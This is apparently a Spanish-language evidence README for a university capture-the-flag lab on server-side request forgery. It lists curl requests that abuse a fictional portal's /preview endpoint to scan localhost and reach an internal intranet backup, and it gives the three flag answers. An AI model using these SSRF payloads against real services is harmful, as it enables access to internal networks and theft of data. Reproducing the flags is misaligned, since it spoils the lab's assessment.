# Evidencia — Lab Extra SSRF (validación contra el entorno Docker oficial)

Explotación del SSRF en el `/preview` del portal público de PhantomCorp, ejecutada
**desde la consola atacante (`cyberlab-attacker`)** contra los contenedores de la
cátedra. La intranet (`phantomcorp-intra`) no es alcanzable directo desde `labnet`:
se llega usando el servidor web (dual-homed) como proxy.

| Archivo | Qué es |
|---|---|
| `transcript-ssrf.txt` | Corrida real de los `curl` vía `/preview`: el oráculo de escaneo de puertos sobre `127.0.0.1` (R1), el descubrimiento de la intranet (R2) y la exfiltración del backup de clientes (R3). Incluye la evasión del filtrado de strings (127.0.0.1 en decimal y forma corta). |
| `ctf-status-extra.txt` | Salida de `./ctf status extra` tras entregar las 3 flags: `3/3 (100%)`, validadas contra los hashes de `labs/labextra-ssrf/retos.manifest`. |

## Flags (validadas contra `labs/labextra-ssrf/retos.manifest`)

| Reto | Flag | SHA-256 |
|---|---|---|
| R1 | `FLAG{ssrf_localhost_panel_interno}` | `c1aaac79…07c12` |
| R2 | `FLAG{ssrf_intranet_descubierta}` | `20f8b9e9…63edc` |
| R3 | `FLAG{ssrf_backup_clientes}` | `e11fbbec…06983` |

## Cómo se reprodujo

```bash
make lab N=extra              # levanta phantomcorp (DMZ+interna) + phantomcorp-intra + consola atacante
make shell                    # entra a cyberlab-attacker (labnet)

# R1 — el /preview como oráculo de puertos de localhost del server
curl -s "phantomcorp/preview?url=http://127.0.0.1:9000/"

# R2 — la intranet, fetcheada por el server desde internalnet
curl -s "phantomcorp/preview?url=http://phantomcorp-intra/"

# R3 — el backup de clientes que la intranet linkea
curl -s "phantomcorp/preview?url=http://phantomcorp-intra/backups/clientes.json"
```

Luego, desde la raíz del repo:

```bash
./ctf submit extra R1 'FLAG{ssrf_localhost_panel_interno}'
./ctf submit extra R2 'FLAG{ssrf_intranet_descubierta}'
./ctf submit extra R3 'FLAG{ssrf_backup_clientes}'
./ctf status extra
```

El análisis completo (cadena de explotación, P1–P5 y conclusión) está en
[`../informe.md`](../informe.md); el research sobre el metadata service de la nube,
en [`../research.md`](../research.md).
